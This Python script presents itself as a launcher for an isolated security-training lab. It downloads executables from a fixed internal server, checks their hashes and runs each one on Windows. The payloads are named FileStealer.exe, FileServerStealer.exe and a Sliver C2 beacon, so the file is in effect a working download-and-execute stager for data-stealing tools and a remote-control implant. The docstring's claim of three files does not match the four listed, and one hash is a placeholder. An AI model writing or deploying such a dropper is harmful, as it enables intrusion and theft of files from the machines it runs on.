r"""Fixed-purpose launcher for an isolated KISEC VM lab.

The program downloads only three hard-coded lab executables from the fixed
private lab server, verifies their embedded SHA-256 values, and launches them
only after every file passes verification. It has no persistence or arbitrary
command/URL support.
"""

from __future__ import annotations

from datetime import datetime, timezone
import hashlib
from pathlib import Path
import subprocess
import sys
import urllib.error
import urllib.request


SERVER_BASE = "http://192.168.50.10:8000"
DESTINATION = Path(r"C:\Windows\Temp\Kisec\payloads")
LOG_PATH = DESTINATION / "runner_log.txt"
DOWNLOAD_LIMIT = 100 * 1024 * 1024
CHUNK_SIZE = 1024 * 1024

# Launch order is intentionally fixed for this lab scenario.
PAYLOADS = (
    (
        "FileStealer.exe",
        "f1c1446c3cff0198db594e7ff58125b9b245258ad15bdc65c8c9ffde3633eec1",
    ),
    (
        "FileServerStealer.exe",
        "62cc7d4d9843e9ccf621fb3a57e12c53db4ba9dc11eda3068acb250d364ecd20",
    ),
    (
        "KisecWinApiReport.exe",
        "d4c7eaf8fdc7fc770a0c9739819da5e468dfe575eb5c70263602678fd35fb2fe",
    ),
    (
        "SLIVER_LAB_BEACON.exe",
        "[BEACON SHA256 HERE]",
    ),
)


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


HTTP_OPENER = urllib.request.build_opener(NoRedirectHandler())


def log(message: str) -> None:
    timestamp = datetime.now(timezone.utc).isoformat()
    line = f"{timestamp} {message}"
    print(line)
    with LOG_PATH.open("a", encoding="utf-8", newline="\n") as stream:
        stream.write(line + "\n")


def sha256_file(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for chunk in iter(lambda: stream.read(CHUNK_SIZE), b""):
            digest.update(chunk)
    return digest.hexdigest()


def download_and_verify(filename: str, expected_hash: str) -> Path:
    url = f"{SERVER_BASE}/{filename}"
    final_path = DESTINATION / filename
    temporary_path = DESTINATION / f"{filename}.part"
    temporary_path.unlink(missing_ok=True)

    log(f"DOWNLOAD_START file={filename} url={url}")
    request = urllib.request.Request(url, headers={"User-Agent": "KISEC-LabRunner/1.0"})
    total = 0
    try:
        with HTTP_OPENER.open(request, timeout=20) as response, temporary_path.open("wb") as output:
            if response.geturl() != url:
                raise RuntimeError("redirected downloads are not allowed")
            content_length = response.headers.get("Content-Length")
            if content_length and int(content_length) > DOWNLOAD_LIMIT:
                raise RuntimeError("declared file size exceeds the lab limit")

            while True:
                chunk = response.read(CHUNK_SIZE)
                if not chunk:
                    break
                total += len(chunk)
                if total > DOWNLOAD_LIMIT:
                    raise RuntimeError("download exceeded the lab limit")
                output.write(chunk)
    except Exception:
        temporary_path.unlink(missing_ok=True)
        raise

    actual_hash = sha256_file(temporary_path)
    if actual_hash.lower() != expected_hash.lower():
        temporary_path.unlink(missing_ok=True)
        raise RuntimeError(
            f"SHA-256 mismatch for {filename}: expected={expected_hash} actual={actual_hash}"
        )

    temporary_path.replace(final_path)
    log(f"VERIFIED file={filename} bytes={total} sha256={actual_hash}")
    return final_path


def main() -> int:
    if sys.platform != "win32":
        print("[ERROR] This lab runner works only on Windows.", file=sys.stderr)
        return 1

    try:
        DESTINATION.mkdir(parents=True, exist_ok=True)
        LOG_PATH.write_text("", encoding="utf-8")

        verified_paths = [
            download_and_verify(filename, expected_hash)
            for filename, expected_hash in PAYLOADS
        ]

        log("ALL_PAYLOADS_VERIFIED")
        for path in verified_paths:
            process = subprocess.Popen([str(path)], cwd=str(DESTINATION))
            log(f"LAUNCHED file={path.name} pid={process.pid}")

        log("RUNNER_COMPLETE")
        return 0
    except (OSError, RuntimeError, urllib.error.URLError) as exc:
        try:
            log(f"ERROR detail={exc}")
        except OSError:
            print(f"[ERROR] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())

